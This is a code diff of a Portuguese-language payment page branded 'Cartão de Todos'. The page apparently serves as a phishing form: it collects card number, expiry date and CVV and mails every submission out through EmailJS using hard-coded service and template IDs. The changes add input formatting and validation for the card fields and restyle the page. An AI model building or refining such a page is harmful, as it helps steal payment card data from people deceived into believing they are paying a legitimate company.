@@ -1,24 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Forma de Arrecadação - Cartão de Todos</title>
     <link rel="stylesheet" type="text/css" href="styles.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script type="text/javascript">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
         (function() {
-            emailjs.init({
-                publicKey: "PH7ve0_A2N2UWzCRI",
-            });
+            emailjs.init("PH7ve0_A2N2UWzCRI");
         })();
     </script>
-    <script type="text/javascript">
+    <script>
         function selectCardType(type) {
             document.getElementById('credit-button').classList.remove('selected');
             document.getElementById('debit-button').classList.remove('selected');
             document.getElementById(type + '-button').classList.add('selected');
             document.getElementById('next-button').style.display = 'block';
-            document.getElementById('card-type').value = type;
+            document.getElementById('hidden-card-type').value = (type === 'credit') ? '2' : '1';
         }
 
         function showPaymentForm() {
@@ -31,16 +30,46 @@
             document.getElementById('thank-you-page').style.display = 'block';
         }
 
+        function validateCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            input.value = formattedValue;
+            input.setCustomValidity(/^(\d{4} ){3}\d{4}$/.test(formattedValue) ? '' : 'Número do cartão inválido');
+        }
+
+        function validateExpiryDate(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            input.setCustomValidity(/^\d{2}\/\d{2}$/.test(input.value) ? '' : 'Data de validade inválida');
+        }
+
+        function validateCVV(input) {
+            input.setCustomValidity(/^\d{3}$/.test(input.value) ? '' : 'CVV inválido');
+        }
+
         window.onload = function() {
             document.getElementById('payment-form').addEventListener('submit', function(event) {
                 event.preventDefault();
                 emailjs.sendForm('service_ylmdgth', 'template_9cur51a', this)
                     .then(() => {
-                        console.log('SUCCESS!');
                         showThankYouPage();
                     }, (error) => {
                         console.log('FAILED...', error);
                     });
+            });
+
+            document.getElementsByName('card_number')[0].addEventListener('input', function() {
+                validateCardNumber(this);
+            });
+
+            document.getElementsByName('expiry_date')[0].addEventListener('input', function() {
+                validateExpiryDate(this);
+            });
+
+            document.getElementsByName('cvv')[0].addEventListener('input', function() {
+                validateCVV(this);
             });
         }
     </script>
@@ -48,7 +77,7 @@
 <body>
     <header>
         <img src="cartaologo.png" alt="Cartão de Todos" class="logo">
-        <a href="wa.link/xpopm6" class="help-link">Ajuda</a>
+        <a href="https://wa.link/xpopm6" class="help-link">Ajuda</a>
     </header>
 
     <div id="selection-page" class="page">
@@ -58,7 +87,7 @@
             <button id="debit-button" onclick="selectCardType('debit')">Débito</button>
         </div>
         <button id="next-button" onclick="showPaymentForm()" class="next-button">Seguir</button>
-        <input type="hidden" id="card-type" name="card_type">
+        <input type="hidden" id="hidden-card-type" name="card_type">
     </div>
 
     <div id="payment-page" class="page" style="display: none;">
@@ -91,7 +120,7 @@ body {
     justify-content: center;
     align-items: center;
     min-height: 100vh;
-    background-color: #f0f4f8;
+    background-color: #e6f0fa;
     flex-direction: column;
     margin: 0;
     padding: 0;
@@ -99,7 +128,7 @@ body {
 
 header {
     width: 100%;
-    background-color: #72d675;
+    background-color: #5df662;
     display: flex;
     justify-content: space-between;
     align-items: center;
@@ -133,14 +162,15 @@ header {
     border-radius: 8px;
     box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
     text-align: center;
-    max-width: 400px;
-    width: 90%;
-    margin-top: 80px; /* Espaço para o header */
+    max-width: 600px;
+    width: 100%;
+    margin-top: 80px;
+    box-sizing: border-box;
 }
 
 h1, h2 {
-    color: #333;
-    margin-bottom: 20px;
+    color: #4a7c50;
+    margin-bottom: 40px;
 }
 
 .button-container {
@@ -148,6 +178,7 @@ h1, h2 {
     justify-content: center;
     gap: 20px;
     margin-bottom: 20px;
+    flex-wrap: wrap;
 }
 
 button {
@@ -167,6 +198,7 @@ button:hover, .selected {
 }
 
 .next-button {
+    align-items: center;
     display: none;
     background-color: #4CAF50;
     color: white;
@@ -195,6 +227,7 @@ input, select {
     margin-bottom: 15px;
     border: 1px solid #ccc;
     border-radius: 5px;
+    box-sizing: border-box;
 }
 
 input[type="submit"] {
